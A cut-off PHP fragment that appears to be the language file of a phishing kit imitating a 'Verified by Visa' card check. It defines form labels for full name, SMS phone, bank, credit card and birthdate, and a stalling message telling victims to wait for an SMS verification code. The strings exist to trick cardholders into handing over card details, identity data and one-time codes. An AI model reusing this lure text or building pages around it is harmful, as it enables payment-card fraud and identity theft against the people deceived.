...
$vbv_tr = [
    'sec' => "Please wait for 5 minutes to receive a verification code via SMS to activate your account. This code is required to proceed. If you do not receive the code, you can try again after 1 hour. Time left ",
    'full_name' => "Full Name",
    'sms' => "Verification Phone (SMS)",
    'bnk' => "Bank",
    'crd' => "Credit Card",
    'dob' => "Birthdate",
    'submit' => "Submit"
